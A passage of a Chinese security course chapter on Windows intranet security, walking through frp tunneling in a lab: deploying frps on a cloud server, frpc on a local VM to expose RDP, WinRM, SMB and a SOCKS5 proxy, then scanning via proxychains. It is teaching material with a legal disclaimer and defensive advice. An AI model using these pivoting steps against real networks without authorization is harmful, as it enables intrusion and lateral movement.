---
title: "08.项目八 Windows内网安全"
---

# 08.项目八 Windows内网安全

---

# 📌 课前回顾

本项目以项目一至项目七所建立的服务器搭建、安全加固与应用安全知识为基础，从"网络边界"视角切入内网安全攻防——当攻击者已经突破外网防线进入内网后，如何进行横向渗透，以及如何构建纵深防御体系阻止攻击扩散。

**回顾问题：**

1. 项目四中 IIS 网站的安全加固措施（日志审计、请求筛选、安全响应头、HTTPS）在内网环境中是否仍然必要？为什么？
2. 项目七中植入的各类后门（注册表、计划任务、WMI事件订阅）如果被攻击者用于内网横向移动后的持久化，安全运维人员应如何排查？
3. Windows 防火墙在项目一中被建议"实验时关闭"，在生产内网环境中应如何正确配置入站/出站规则以限制横向移动？
4. 项目六中域控制器的 NTDS.dit 数据库包含哪些敏感信息？攻击者获取后能造成什么危害？
5. 项目五中配置的远程桌面（RDP）和 WinRM 服务，在内网横向移动攻击中会被攻击者如何利用？

🔗

**知识衔接**：前序项目按"服务搭建 → 网站部署 → 安全加固 → 远程管理 → 域管理 → 应用安全"构成了完整的服务器运维链。本项目转换视角，从网络边界切入——讲解当攻击者已经突破外网防线、进入企业内网后，如何利用 frp 内网穿透、凭据窃取等技术进行横向渗透与权限扩张，以及如何从网络层面构建纵深防御体系。通过理解"攻击者在内网中如何移动"，方能制定有效的内网隔离与监控策略。

⚠️

**声明**：本项目内容仅用于授权环境下的安全教学与攻防演练。严禁对未经授权的系统实施任何渗透测试行为，违者将依法承担相应法律责任。

---



# 🎯 学习目标

| 层次 | 内容 |
| --- | --- |
| 知识 | 理解内网安全的基本概念与面临的威胁；理解内网穿透的工作机制与原理；掌握 frp 内网穿透工具的架构与配置方法（服务端 TOML 配置、客户端隧道定义）；理解反向代理与隧道转发的工作流程；掌握内网信息收集的方法与常用命令；理解 Pass-the-Hash 等横向移动技术的原理；掌握内网安全纵深防御策略 |
| 技能 | 能够在阿里云 ECS 上部署 frp 服务端（frps），配置安全组放行必要端口；能够在本地虚拟机上部署 frp 客户端（frpc），配置 TCP/HTTP/SOCKS5 隧道；能够使用 Nmap 通过 frp 隧道扫描内网服务；能够使用 Impacket/NetExec（nxc）工具进行横向移动；能够实施内网安全加固措施（SMB签名、Protected Users、防火墙规则等） |
| 素养 | 树立"边界突破不等于安全终结"的纵深防御意识；理解内网穿透工具在攻防演练中的双刃剑作用；强化法律意识，明确未授权网络渗透的法律后果；培养从攻击者视角审视内网安全防御的能力 |

---

# ⚠️ 重难点梳理

| 类型 | 内容 | 说明 |
| --- | --- | --- |
| 重点 | frp内网穿透的部署与配置 | 掌握在阿里云 ECS 上部署 frps 服务端（TOML 配置格式），在本地虚拟机上部署 frpc 客户端，配置 TCP/HTTP/SOCKS5 隧道类型及认证方式 |
| 重点 | 阿里云安全组配置 | 掌握 ECS 安全组规则的配置方法，理解入站/出站规则对 frp 通信的影响 |
| 重点 | 内网信息收集的方法体系 | 掌握 Windows 内置命令（ipconfig/arp/netstat/net view）和 Nmap 扫描的组合使用 |
| 重点 | 内网横向移动技术 | 理解 Pass-the-Hash 的原理，掌握 Impacket 工具族（impacket-psexec / impacket-wmiexec / impacket-secretsdump）的使用 |
| 难点 | frp多级代理与流量转发链路 | 理解 frp 如何通过公网服务器建立隧道链将内网服务暴露到外部，以及 SOCKS5 代理与 proxychains 的配合使用 |
| 难点 | 内网攻击链的完整理解 | 从初始访问 → 信息收集 → 凭据获取 → 横向移动 → 域控攻陷 → 持久化的完整攻击链路 |
| 难点 | 内网安全防御体系设计 | 理解网络分段、零信任、Tier管理模型等防御理念如何在实际环境中落地 |

---

# 任务一 认识内网安全与NAT转发

## 🧠 理论知识

### 内网安全概述

**内网（Intranet）** 是企业/组织内部使用的专用网络，与互联网（Internet）通过防火墙或路由器隔离。

**内网安全面临的威胁**：

- 外部攻击者突破边界后的横向移动
- 内部人员的恶意操作或误操作
- 受感染的终端作为"跳板"传播攻击
- 供应链攻击植入的恶意软件

**典型内网攻击流程（ATT&CK框架）**：

```
初始访问 → 执行 → 持久化 → 权限提升 → 防御规避 → 凭证访问 → 发现 → 横向移动 → 收集 → 渗漏
```

> 💡 **传统安全误区**：很多企业认为"内网 = 安全"，将安全预算集中在外网防护（防火墙、WAF）上。事实上，现代攻击者突破边界后，内网往往缺乏有效防护——主机间互信、缺乏网络分段、弱密码普遍、安全监控不足，使得横向移动畅通无阻。这正是"内网安全"成为独立安全课题的根本原因。

---

### 私有IP地址与NAT原理

#### 私有IP地址范围

RFC 1918 定义了三段私有IP地址，不会在互联网上被路由：

| 类别 | IP范围 | 默认子网掩码 | 可用地址数量 |
| --- | --- | --- | --- |
| A类 | 10.0.0.0 ~ 10.255.255.255 | 255.0.0.0 (/8) | 约1677万 |
| B类 | 172.16.0.0 ~ 172.31.255.255 | 255.240.0.0 (/12) | 约104万 |
| C类 | 192.168.0.0 ~ 192.168.255.255 | 255.255.0.0 (/16) | 约6.5万 |

> 💡 **企业内网**通常使用 C 类（192.168.x.x）或 A 类（10.x.x.x）私有地址，并通过 NAT 将内部地址转换为公网地址访问互联网。

#### NAT（网络地址转换）工作原理

**NAT（Network Address Translation）** 是将私有IP地址转换为公有IP地址的技术，解决IPv4地址不足问题的同时，也天然形成了内网与外网之间的隔离。

```
NAT工作原理示意图：

  内网主机 A（192.168.1.100）         外网服务器（8.8.8.8）
        │                                    │
        │ ① 发送数据包                       │
        │ 源IP: 192.168.1.100                │
        │ 目标IP: 8.8.8.8                    │
        ▼                                    │
  ┌─────────────────────┐                    │
  │      NAT路由器       │                    │
  │  公网IP: 203.0.113.1 │                    │
  │                       │                    │
  │ ② 转换源地址          │                    │
  │ 192.168.1.100:12345   │                    │
  │      ↓                │                    │
  │ 203.0.113.1:54321     │                    │
  │                       │ ③ 转发数据包       │
  └───────────┬───────────┘  源IP: 203.0.113.1 │
              │           目标IP: 8.8.8.8       │
              └────────────────────────────────→│
                                                │
              ┌─────────────────────────────────┘
              │ ④ 返回响应
              │ 源IP: 8.8.8.8
              │ 目标IP: 203.0.113.1:54321
              ▼
  ┌─────────────────────┐
  │      NAT路由器       │
  │                       │
  │ ⑤ 反向转换目标地址    │
  │ 203.0.113.1:54321     │
  │      ↓                │
  │ 192.168.1.100:12345   │
  └───────────┬───────────┘
              │
              ▼
        内网主机 A 收到响应
```

#### NAT类型对比

| NAT类型 | 英文名 | 说明 | 典型场景 |
| --- | --- | --- | --- |
| **静态NAT** | Static NAT | 一对一映射，一个私有IP固定对应一个公网IP | 企业服务器对外发布 |
| **动态NAT** | Dynamic NAT | 从公网IP池中动态分配，用完释放 | 内网主机临时访问外网 |
| **PAT/NAPT** | Port Address Translation | 多个私有IP共享一个公网IP，通过端口号区分 | 家庭路由器、小型企业 |

---

### 端口映射（Port Forwarding）

**端口映射**是 NAT 的一种特殊应用——将 NAT 设备的特定端口映射到内网主机的特定端口，使外部可以通过 NAT 设备的公网IP访问内网服务。

```
端口映射示意图：

外部攻击者                  NAT网关（双网卡）                内网服务器
192.168.10.10              192.168.10.20（公网侧）          192.168.100.30
                           192.168.100.20（内网侧）

攻击者访问                    端口映射规则：                  内网服务
192.168.10.20:3389  ──→   3389 → 192.168.100.30:3389  ──→  RDP服务(3389)
192.168.10.20:8080  ──→   8080 → 192.168.100.30:80    ──→  Web服务(80)
192.168.10.20:2222  ──→   2222 → 192.168.100.30:22    ──→  SSH服务(22)
```

**Windows 端口映射实现方式**：

| 方式 | 命令/工具 | 适用场景 |
| --- | --- | --- |
| **netsh portproxy** | `netsh interface portproxy add v4tov4` | Windows Server 自带，无需安装 |
| **RRAS** | 路由和远程访问服务 | 企业级路由+NAT方案 |
| **第三方工具** | frp、nps、ngrok | 内网穿透（无需公网IP） |

---

### 路由和远程访问服务（RRAS）

**RRAS（Routing and Remote Access Service）** 是 Windows Server 内置的路由和远程访问功能，提供 NAT、VPN、拨号等多种网络服务。

```
RRAS NAT工作模式：

场景：内网服务器（192.168.100.30）需要通过NAT网关访问外网

  内网服务器 ──→ NAT网关（RRAS）──→ 外网
  192.168.100.30   192.168.100.20     192.168.10.20
                   （内网接口）        （公网接口）

  RRAS在"公网接口"上启用NAT：
  - 出站：内网源地址被转换为公网接口地址
  - 入站：通过端口映射规则转发到内网主机
```

---

## 🛠️ 实践操作

### 实验环境总体说明

> 本项目使用 **阿里云 ECS** 作为公网穿透服务器，配合**本地虚拟机**模拟内网主机，通过 frp 实现真实的内网穿透。
>
> **实验架构**：
>
> | 设备 | 角色 | 运行位置 | 操作系统 |
> | --- | --- | --- | --- |
> | **阿里云 ECS** | 公网穿透服务器（frps） | 阿里云 | Ubuntu 22.04 |
> | **SRV02** | 内网主机（frpc） | 本地 VMware/VirtualBox | Windows Server 2022 |
> | **Kali Linux** | 攻击机 | 本地 VMware/VirtualBox | Kali Linux 2024+ |
>
> **预估费用**：ECS 按量付费约 ¥3-8（实验 3-4 小时）。**实验结束后务必释放 ECS 实例和弹性公网 IP，避免持续扣费。**
>
> ⚠️ **配置要求**：
> - ECS 需要分配**弹性公网 IP（EIP）**，安全组需放行 frp 相关端口
> - SRV02 为本地虚拟机，NAT 模式（需能访问互联网以连接 ECS 的 frps）
> - Kali 为本地虚拟机，需能访问互联网（连接 ECS 的 frp 映射端口）

---

### 实验1：阿里云服务器购买与frp服务端部署

> **实验目标**：购买阿里云 ECS 服务器作为公网中转服务器，部署 frp 服务端（frps），为后续内网穿透实验做准备。

**网络拓扑设计**：

```
                    内网穿透实验拓扑

  ┌──────────┐          互联网            ┌──────────────────┐        ┌──────────┐
  │  Kali    │◄────────────────────────►│   阿里云 ECS      │◄─隧道──│  SRV02   │
  │  攻击机  │   通过EIP访问frp端口       │   公网IP: EIP    │        │ 内网主机  │
  │  (本地)  │                           │   frps 服务端     │        │ frpc客户端│
  └──────────┘                           │   端口: 7000/7500│        │  (本地VM) │
                                         └──────────────────┘        └──────────┘

  工作流程：
  ① SRV02（本地虚拟机）上的 frpc 主动连接阿里云 ECS 的 frps（7000端口），建立控制隧道
  ② Kali 访问阿里云 ECS 的映射端口（如 10001）
  ③ frps 通过隧道将流量转发给 frpc，frpc 再转给本地服务（RDP:3389, Web:80 等）

  关键点：
  - 阿里云 ECS 有公网IP，Kali 可通过互联网访问
  - SRV02 在本地内网中，没有公网IP，通过 frp 隧道反向暴露服务
  - 这就是真实的”内网穿透”场景——内网主机主动出站，通过公网服务器暴露服务
```

**第一步：购买阿里云 ECS 服务器**

1. 访问 [阿里云官网](https://www.aliyun.com/)，注册并登录账号
2. 进入 **云服务器 ECS** 控制台，点击”创建实例”
3. 配置如下：

| 配置项 | 推荐选择 |
| --- | --- |
| **计费方式** | 按量付费（实验用完即释放，避免持续扣费） |
| **地域** | 选择离你最近的区域（如华东1-杭州、华东2-上海） |
| **实例规格** | ecs.t6-c1m2.large（2 vCPU / 4 GB）或更低规格即可 |
| **镜像** | Ubuntu 22.04 64位（推荐）或 CentOS 8 |
| **系统盘** | 40 GB 高效云盘 |
| **网络** | 专有网络 VPC（使用默认 VPC） |
| **公网IP** | 选择”分配公网 IPv4 地址”（按使用流量计费） |
| **安全组** | 创建新安全组或使用默认安全组（后续配置规则） |
| **登录凭证** | 设置 root 密码（记好密码！） |

4. 确认订单并创建实例
5. 创建完成后，在 ECS 实例列表中记录 **公网 IP 地址**（如 `47.xxx.xxx.xxx`），后续实验中以 `<ECS公网IP>` 表示

> ⚠️ **费用提醒**：按量付费的 ECS 实验 3-4 小时费用约 ¥3-8（取决于规格和流量）。**实验结束后务必释放 ECS 实例和弹性公网 IP**，否则会持续扣费！

**第二步：配置阿里云安全组**

安全组是阿里云 ECS 的虚拟防火墙，控制哪些端口可以从外部访问。

1. 在 ECS 控制台 → 左侧菜单 → **安全组**
2. 找到 ECS 实例关联的安全组，点击”配置规则”
3. 添加以下**入方向**规则：

| 授权策略 | 协议类型 | 端口范围 | 授权对象 | 用途 |
| --- | --- | --- | --- | --- |
| 允许 | TCP | 22 | 0.0.0.0/0 | SSH 远程管理 |
| 允许 | TCP | 7000 | 0.0.0.0/0 | frp 客户端连接端口 |
| 允许 | TCP | 7500 | 0.0.0.0/0 | frp Dashboard 管理面板 |
| 允许 | TCP | 10000-20000 | 0.0.0.0/0 | frp 隧道映射端口范围 |
| 允许 | ICMP | -1/-1 | 0.0.0.0/0 | ping 测试 |

> 💡 **安全组说明**：阿里云安全组默认拒绝所有入站流量，必须手动添加允许规则。`0.0.0.0/0` 表示允许所有来源 IP，实验环境可以使用；生产环境应限制为特定 IP。

**第三步：SSH 连接 ECS 服务器**

```bash
# 在本地电脑（宿主机）上使用 SSH 连接 ECS
# Windows 用户可使用 PowerShell、PuTTY 或 Windows Terminal

ssh root@<ECS公网IP>
# 输入购买时设置的 root 密码

# 预期：成功登录 Ubuntu 系统，显示 root@xxx:~# 提示符
```

**第四步：在ECS上安装frp服务端**

```bash
# 在 ECS 服务器上执行

# 更新系统
sudo apt update && sudo apt upgrade -y

# 下载 frp 最新版本
# 访问 https://github.com/fatedier/frp/releases 获取最新版本号
# 以下以 v0.61.1 为例，请替换为实际最新版本
cd /opt
sudo wget https://github.com/fatedier/frp/releases/download/v0.61.1/frp_0.61.1_linux_amd64.tar.gz
sudo tar -xzf frp_0.61.1_linux_amd64.tar.gz
sudo mv frp_0.61.1_linux_amd64 frp
cd frp

# 查看文件结构
ls -la
# 预期文件：
# frps         —— 服务端可执行文件
# frps.toml    —— 服务端配置文件（v0.52+ 使用 TOML 格式）
# frpc         —— 客户端可执行文件（拷贝到内网主机使用）
# frpc.toml    —— 客户端配置文件
```

**第五步：配置frp服务端（frps.toml）**

```bash
# 在 ECS 上编辑 frps.toml
sudo nano /opt/frp/frps.toml
```

写入以下配置内容：

```toml
# frps.toml - frp 服务端配置
# frp 服务端监听端口（客户端连接端口）
bindPort = 7000

# Dashboard（Web管理面板）配置
webServer.addr = “0.0.0.0”
webServer.port = 7500
webServer.user = “admin”
webServer.password = “admin123”

# 认证方式（token模式，客户端必须提供相同token才能连接）
auth.method = “token”
auth.token = “ClassDemo2025”

# 日志配置
log.to = “./frps.log”
log.level = “info”
log.maxDays = 7

# 允许客户端映射的端口范围
allowPorts = [
  { start = 10000, end = 20000 }
]
```

```bash
# 启动 frp 服务端
sudo /opt/frp/frps -c /opt/frp/frps.toml

# 预期输出：
# [I] frps tcp listen on 0.0.0.0:7000
# [I] http service listen on 0.0.0.0:7500
# [I] frps started successfully
```

> ⚠️ **预期结果**：frps 成功启动，监听 7000 端口（客户端连接）和 7500 端口（Web管理面板）。保持终端运行（或使用 `tmux` / `nohup` 后台运行）。

```bash
# 验证 frps 服务端已启动
ss -tlnp | grep -E “7000|7500”
# 预期输出：
# LISTEN  0  128  0.0.0.0:7000  0.0.0.0:*
# LISTEN  0  128  0.0.0.0:7500  0.0.0.0:*

# 在本地浏览器中访问 frp Dashboard
# 地址：http://<ECS公网IP>:7500
# 用户名：admin  密码：admin123
# 预期：显示 frp Dashboard 页面，可查看客户端连接状态和隧道信息
```

> 💡 **后台运行 frps**：
> ```bash
> # 使用 nohup 后台运行
> nohup /opt/frp/frps -c /opt/frp/frps.toml > /dev/null 2>&1 &
> 
> # 或使用 tmux
> tmux new-session -d -s frps '/opt/frp/frps -c /opt/frp/frps.toml'
> # 重新连接：tmux attach -t frps
> ```

---

### 实验2：本地虚拟机配置与frp客户端部署

> **实验目标**：在本地虚拟机（SRV02，模拟内网主机）上部署 frp 客户端，通过隧道将本地服务暴露到阿里云 ECS 上。

**第一步：准备本地虚拟机（SRV02）**

SRV02 是一台运行在本地 VMware/VirtualBox 中的 Windows Server 虚拟机，模拟企业内网中的服务器：

| 配置项 | 要求 |
| --- | --- |
| 操作系统 | Windows Server 2022 / 2025 |
| 内存 | 4 GB |
| 硬盘 | 60 GB |
| 网络 | NAT 模式（需要能访问互联网，用于连接阿里云 ECS） |

> 💡 **关键理解**：SRV02 的网络模式可以是 NAT 或桥接，只要能访问互联网即可。frpc 需要主动连接阿里云 ECS 的 7000 端口，这是一条**出站连接**——企业防火墙通常允许出站连接，这正是内网穿透工具能工作的根本原因。

**第二步：在SRV02上启用基础服务**

```powershell
# 在 SRV02 上以管理员身份运行 PowerShell

# 1. 启用远程桌面
Set-ItemProperty -Path “HKLM:\System\CurrentControlSet\Control\Terminal Server” -Name “fDenyTSConnections” -Value 0
Enable-NetFirewallRule -DisplayGroup “Remote Desktop”

# 2. 启用 WinRM（远程管理）
Enable-PSRemoting -Force

# 3. 启用 IIS Web 服务器（用于测试 HTTP 隧道）
Install-WindowsFeature -Name Web-Server -IncludeManagementTools

# 4. 创建测试页面
Set-Content -Path “C:\inetpub\wwwroot\index.html” -Value “<html><body><h1>SRV02 内网服务器 - frp 隧道穿透成功！</h1><p>此页面通过 frp 内网穿透从阿里云 ECS 访问。</p></body></html>”

# 5. 关闭防火墙（仅实验环境，方便测试）
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False

# 6. 验证本地服务
curl http://localhost
# 预期：返回上面创建的 HTML 页面
```

**第三步：将frp客户端拷贝到SRV02**

从阿里云 ECS 上下载 frp 客户端到本地虚拟机：

**方法一：直接在 SRV02 上下载（推荐）**

```powershell
# 在 SRV02 上以管理员身份运行 PowerShell
# 直接从 GitHub 下载 Windows 版 frp

cd C:\
Invoke-WebRequest -Uri “https://github.com/fatedier/frp/releases/download/v0.61.1/frp_0.61.1_windows_amd64.zip” -OutFile “frp.zip”
Expand-Archive -Path “frp.zip” -DestinationPath “C:\frp” -Force

# 验证文件
Get-ChildItem C:\frp
# 预期包含：frpc.exe、frpc.toml 等文件
```

**方法二：通过 SCP 从 ECS 拷贝（备选）**

```bash
# 在本地宿主机上执行，将 ECS 上的 frpc 文件下载到本地
scp root@<ECS公网IP>:/opt/frp/frpc ./frpc
scp root@<ECS公网IP>:/opt/frp/frpc.toml ./frpc.toml
# 然后将文件拷贝到 SRV02 虚拟机中（通过 VMware 共享文件夹或 U 盘）
```

**方法三：使用 VMware 共享文件夹**

1. 将 frp 文件放在宿主机某目录
2. 虚拟机设置 → 选项 → 共享文件夹 → 添加该目录
3. 在 SRV02 中访问 `\\vmware-host\Shared Folders\` 拷贝文件

**第四步：配置frp客户端（frpc.toml）**

```powershell
# 在 SRV02 上编辑 frpc.toml
notepad C:\frp\frpc.toml
```

写入以下配置内容：

```toml
# frpc.toml - frp 客户端配置

# frp 服务端地址（阿里云 ECS 的公网 IP）
serverAddr = “<ECS公网IP>”
serverPort = 7000

# 认证（必须与服务端一致）
auth.method = “token”
auth.token = “ClassDemo2025”

# 日志配置
log.to = “./frpc.log”
log.level = “info”

# 隧道1：RDP远程桌面映射
# Kali访问 <ECS公网IP>:10001 → SRV02的3389端口
[[proxies]]
name = “rdp”
type = “tcp”
localIP = “127.0.0.1”
localPort = 3389
remotePort = 10001

# 隧道2：Web服务映射
# Kali访问 <ECS公网IP>:10002 → SRV02的80端口
[[proxies]]
name = “web”
type = “tcp”
localIP = “127.0.0.1”
localPort = 80
remotePort = 10002

# 隧道3：WinRM远程管理映射
# Kali访问 <ECS公网IP>:10003 → SRV02的5985端口
[[proxies]]
name = “winrm”
type = “tcp”
localIP = “127.0.0.1”
localPort = 5985
remotePort = 10003

# 隧道4：SMB文件共享映射
# Kali访问 <ECS公网IP>:10004 → SRV02的445端口
[[proxies]]
name = “smb”
type = “tcp”
localIP = “127.0.0.1”
localPort = 445
remotePort = 10004

# 隧道5：SOCKS5代理（通过frp隧道访问整个内网）
[[proxies]]
name = “socks5”
type = “tcp”
remotePort = 10080
[proxies.plugin]
type = “socks5”
```

> ⚠️ **重要**：将 `<ECS公网IP>` 替换为你的阿里云 ECS 的实际公网 IP 地址（如 `47.xxx.xxx.xxx`）。

**第五步：启动frp客户端**

```powershell
# 在 SRV02 上以管理员身份运行 PowerShell

# 启动 frp 客户端
C:\frp\frpc.exe -c C:\frp\frpc.toml

# 预期输出：
# [I] [service.go:302] [xxxxxxxx] login to server success
# [I] [proxy_manager.go:144] proxy added: [rdp web winrm smb socks5]
# [I] [service.go:109] [xxxxxxxx] [rdp] start proxy success
# [I] [service.go:109] [xxxxxxxx] [web] start proxy success
# ...
```

> ⚠️ **预期结果**：客户端显示”login to server success”表示成功连接到阿里云 ECS 上的 frp 服务端。所有隧道（rdp、web、winrm、smb、socks5）均显示”start proxy success”。
>
> **如果连接失败**，检查：（1）阿里云安全组是否放行了 7000 端口；（2）frpc.toml 中的 `<ECS公网IP>` 和 token 是否正确；（3）SRV02 本地虚拟机是否能访问互联网。

---

### 实验3：验证frp隧道穿透效果

> **实验目标**：通过 Kali 攻击机（或任何可访问互联网的电脑）验证 frp 隧道是否成功将 SRV02 的内网服务暴露到公网。

**第一步：通过浏览器访问frp Dashboard**

在本地电脑浏览器中打开：

```
http://<ECS公网IP>:7500
```

输入用户名 `admin`，密码 `admin123`，查看：
- 客户端列表中 SRV02 应显示为”在线”
- 隧道列表中 rdp、web、winrm、smb、socks5 均应显示正常

**第二步：验证各隧道端口**

```bash
# 使用 nmap 扫描 ECS 的映射端口（在 Kali 或本地电脑上执行）

nmap -p 10001,10002,10003,10004 <ECS公网IP>

# 预期输出：
# PORT     STATE  SERVICE
# 10001/tcp open   隧道1(RDP)
# 10002/tcp open   隧道2(Web)
# 10003/tcp open   隧道3(WinRM)
# 10004/tcp open   隧道4(SMB)
```

**第三步：验证Web隧道穿透**

```bash
# 通过 frp 隧道访问 SRV02 的 IIS Web 服务
curl http://<ECS公网IP>:10002

# 预期输出：
# <html><body><h1>SRV02 内网服务器 - frp 隧道穿透成功！</h1>...
```

在浏览器中打开 `http://<ECS公网IP>:10002`，应显示 SRV02 的测试页面。

**第四步：验证RDP隧道穿透**

```bash
# 使用 xfreerdp 通过 frp 隧道连接 SRV02 的远程桌面
xfreerdp /v:<ECS公网IP> /port:10001 /u:administrator /p:'P@ssw0rd' /cert:ignore
```

或在 Windows 宿主机上：
1. 打开”远程桌面连接”（mstsc）
2. 计算机：`<ECS公网IP>:10001`
3. 输入 SRV02 的管理员账户和密码
4. 预期：成功显示 SRV02 的远程桌面

> ⚠️ **预期结果**：
> - frp Dashboard 显示所有隧道正常
> - 通过 `<ECS公网IP>:10002` 可以访问 SRV02 的 Web 服务
> - 通过 `<ECS公网IP>:10001` 可以 RDP 连接到 SRV02
> - **这就是内网穿透的完整效果**——SRV02 在本地内网中没有公网 IP，但通过 frp 隧道，任何人都可以通过阿里云 ECS 的公网 IP 访问 SRV02 的服务

> 💡 **安全启示**：
> - frp 客户端只需一条**出站连接**（到 ECS:7000），即可将所有内网服务暴露出去
> - 企业防火墙通常不阻止出站连接，这使得 frp 等工具极难从网络层面阻止
> - 攻击者一旦在内网主机植入 frpc，即可将内网的 RDP、Web、SMB 等服务暴露到公网，为后续横向移动提供通道
> - **防御关键**：监控内网主机的异常出站连接，部署 EDR 检测 frpc 等可疑进程

---

## 📝 任务一知识点总结

| 知识点 | 要点 |
| --- | --- |
| 内网安全威胁 | 边界突破后的横向移动、内部人员恶意操作、受感染终端传播 |
| 私有IP地址 | 10.0.0.0/8、172.16.0.0/12、192.168.0.0/16，不路由到互联网 |
| NAT原理 | 将私有IP转换为公网IP，通过端口号区分会话（PAT/NAPT） |
| 内网穿透概念 | 内网主机主动连接公网服务器建立隧道，外部通过隧道反向访问内网 |
| frp架构 | frps（服务端，部署在阿里云ECS）+ frpc（客户端，运行在内网主机） |
| frp隧道类型 | TCP（端口映射）、HTTP/HTTPS（域名代理）、SOCKS5（全网段代理） |
| 阿里云安全组 | ECS 的虚拟防火墙，控制入站/出站流量，默认拒绝所有入站 |
| frp防御要点 | 监控异常出站连接、部署EDR检测可疑进程、限制出站流量 |

---

# 任务二 内网穿透实战

## 🧠 理论知识

### 内网穿透的概念与原理

**内网穿透**（Intranet Penetration / NAT Traversal）是指在无法直接访问内网主机的情况下，通过中间代理或隧道技术建立从外网到内网的通信通道。

**为什么需要内网穿透？**

```
典型企业网络架构：

  互联网用户                     企业内网
  (无法直接访问内网)              192.168.x.x
       │                           │
       │    ┌─────────────────┐    │
       └───►│   防火墙/NAT     │◄───┘
            │   仅允许出站连接  │
            └─────────────────┘

问题：
  ✗ 内网主机没有公网IP
  ✗ 防火墙仅允许内网主动向外发起连接
  ✗ 外部无法主动连接到内网主机

解决方案——内网穿透：
  内网主机 主动向外 建立一条隧道
  外部通过这条隧道 反向访问 内网服务
```

---

### 正向代理与反向代理

```
正向代理（Forward Proxy）——代理客户端：
  客户端 ──→ 代理服务器 ──→ 目标服务器
  客户端知道要访问谁，代理服务器代替客户端去访问
  用途：绕过访问限制、隐藏客户端身份

反向代理（Reverse Proxy）——代理服务器：
  客户端 ──→ 代理服务器 ──→ 后端服务器
  客户端不知道真实后端是谁，代理服务器接收请求并转发
  用途：负载均衡、CDN、隐藏服务器身份

内网穿透 = 反向代理的一种特殊应用：
  攻击机 ──→ 公网代理服务器 ←──(内网主机主动建立隧道)── 内网主机
                ↑
          内网主机主动出站建立连接
          攻击机通过同一条连接反向访问内网
```

---

### frp 内网穿透工具

**frp（Fast Reverse Proxy）** 是一个高性能的反向代理应用，专注于内网穿透。其核心思想是：**让内网主机主动连接到公网服务器，建立隧道，外部通过该隧道访问内网服务**。

```
frp 架构：

  ┌────────────┐          ┌────────────────┐         ┌────────────┐
  │   攻击机   │          │  公网服务器      │         │  内网主机   │
  │   Kali     │          │  frps 服务端     │         │  SRV02     │
  │            │          │  (阿里云ECS上运行) │         │  frpc 客户端│
  │            │          │                  │         │            │
  │  访问      │    ②     │  接收请求         │   ③    │  提供服务   │
  │  :7500端口─┼─────────►│  转发给frpc      ├────────►│  RDP/SSH   │
  │            │          │                  │         │  Web...    │
  │            │          │                  │   ①    │            │
  │            │          │◄─────────────────┼─────────│  主动连接   │
  │            │          │  建立控制隧道     │         │  frps服务端 │
  └────────────┘          └────────────────┘         └────────────┘

  步骤：
  ① frpc（内网）主动连接 frps（公网），建立控制隧道
  ② 攻击机访问 frps 的映射端口
  ③ frps 通过隧道将流量转发给 frpc，frpc 再转给内网服务
```

**frp 支持的隧道类型**：

| 隧道类型      | 说明           | 适用场景                |
| --------- | ------------ | ------------------- |
| **TCP**   | 端口到端口的直接映射   | RDP、SSH、MySQL等TCP服务 |
| **UDP**   | UDP端口映射      | DNS、VoIP等UDP服务      |
| **HTTP**  | 基于域名的HTTP代理  | Web服务（支持虚拟主机）       |
| **HTTPS** | HTTPS代理      | 安全Web服务             |
| **STCP**  | 安全TCP（需密钥认证） | 需要身份验证的隧道           |
| **SUDP**  | 安全UDP        | 需要身份验证的UDP隧道        |
| **XTCP**  | 点对点穿透        | P2P直连（减少中转流量）       |
|           |              |                     |

---

### nps 内网穿透工具

**nps** 是一款轻量级、高性能的内网穿透代理服务器，最大的特点是提供了 **Web 管理界面**，可以通过浏览器管理所有隧道配置。

```
nps 架构：

  ┌────────────┐          ┌────────────────┐         ┌────────────┐
  │   攻击机   │          │  公网服务器      │         │  内网主机   │
  │   Kali     │          │  nps 服务端      │         │  SRV02     │
  │            │          │  Web管理界面     │         │  npc 客户端 │
  │            │          │  :8080(管理)     │         │            │
  │            │          │  :映射端口(隧道)  │         │            │
  └────────────┘          └────────────────┘         └────────────┘

  管理方式：
  浏览器访问 http://Kali_IP:8080 → Web管理界面
  在界面上添加客户端 → 配置隧道 → 自动生成配置文件
```

---

### 其他内网穿透工具对比

| 工具 | 语言 | 特点 | Web管理 | 加密 | 适用场景 |
| --- | --- | --- | --- | --- | --- |
| **frp** | Go | 高性能，配置灵活，社区活跃 | 有Dashboard | 可选TLS | 通用内网穿透 |
| **nps** | Go | Web管理界面，操作简便 | 有（主要特点） | 可选 | 可视化管理场景 |
| **ew（EarthWorm）** | C | 轻量级，支持多级代理链 | 无 | 无 | 应急渗透（已停更） |
| **Chisel** | Go | 基于HTTP/SSH协议，穿越Web代理 | 无 | 内置 | 穿越严格防火墙 |
| **rathole** | Rust | 高性能，类似frp的替代品 | 无 | 可选 | 高性能场景 |
| **ngrok** | — | 商业服务，注册即可使用 | 有 | 内置 | 快速演示（需注册） |
| **SSH隧道** | — | 利用SSH协议，无需额外安装 | 无 | 内置 | 临时端口转发 |

> 💡 **课堂选择建议**：frp 是目前最主流的开源内网穿透工具，配置简单且功能全面，适合课堂教学。nps 提供 Web 管理界面更直观，适合辅助演示。本课程重点讲解 frp，简要演示 nps。

---

## 🛠️ 实践操作

### 实验4：frp SOCKS5代理与proxychains内网扫描（进阶）

> ⚠️ **前置条件**：完成实验1-3（frp 基础隧道已建立并验证通过）。本实验演示 frp 的 SOCKS5 代理功能——通过一条隧道访问整个内网。
>
> **实验场景**：SRV02 的 frpc 配置中已包含 SOCKS5 隧道（端口 10080）。本实验通过 Kali（或任何攻击机）连接 SOCKS5 代理，使用 proxychains 配合 Nmap 扫描 SRV02 本地网段中的服务。

**第一步：确认SOCKS5代理可用**

在实验2的 frpc.toml 中，已配置了 SOCKS5 隧道：

```toml
# SOCKS5 代理隧道（已在实验2中配置）
[[proxies]]
name = "socks5"
type = "tcp"
remotePort = 10080
[proxies.plugin]
type = "socks5"
```

验证 SOCKS5 代理端口是否开放：

```bash
# 在 Kali 或本地电脑上执行
nmap -p 10080 <ECS公网IP>
# 预期：10080/tcp open
```

**第二步：配置proxychains**

```bash
# 在 Kali 上编辑 proxychains 配置
sudo nano /etc/proxychains4.conf

# 在文件末尾找到 [ProxyList] 部分，替换为：
# [ProxyList]
# socks5 <ECS公网IP> 10080

# 确保其他行保持默认（特别是 dynamic_chain 或 strict_chain）
```

**第三步：通过SOCKS5代理访问SRV02服务**

```bash
# 通过 SOCKS5 代理访问 SRV02 的 Web 服务
proxychains curl http://127.0.0.1
# 预期：返回 SRV02 的 IIS 测试页面

# 通过 SOCKS5 代理扫描 SRV02 开放的端口
